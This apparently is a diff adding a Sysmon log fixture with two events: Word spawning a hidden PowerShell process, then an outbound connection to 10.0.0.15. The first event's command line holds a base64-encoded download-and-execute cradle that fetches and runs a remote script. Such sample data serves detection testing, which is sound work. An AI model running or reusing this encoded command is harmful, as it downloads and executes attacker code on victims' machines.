@@ -1,0 +1,38 @@
+[
+  {
+    "event_id": "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
+    "timestamp": "2026-09-01T10:15:30Z",
+    "source": "sysmon",
+    "event_type": "process_creation",
+    "host": "WORKSTATION-04",
+    "user": "corp\\jdoe",
+    "src_ip": "192.168.1.104",
+    "dest_ip": null,
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgAxADUALwBzAC4AcABzADEAJwApAA==",
+    "raw_log": {
+      "EventID": 1,
+      "ParentProcessName": "WINWORD.EXE",
+      "UtcTime": "2026-09-01 10:15:30.123",
+      "ProcessGuid": "{7A336214-5A6A-66D4-0000-00106B491200}"
+    }
+  },
+  {
+    "event_id": "c3a1b02a-9e12-4cf0-8bc2-a5d4e12e8b21",
+    "timestamp": "2026-09-01T10:15:34Z",
+    "source": "sysmon",
+    "event_type": "network_connection",
+    "host": "WORKSTATION-04",
+    "user": "corp\\jdoe",
+    "src_ip": "192.168.1.104",
+    "dest_ip": "10.0.0.15",
+    "process_name": "powershell.exe",
+    "command_line": null,
+    "raw_log": {
+      "EventID": 3,
+      "DestinationPort": 80,
+      "Protocol": "tcp",
+      "Initiated": true
+    }
+  }
+]
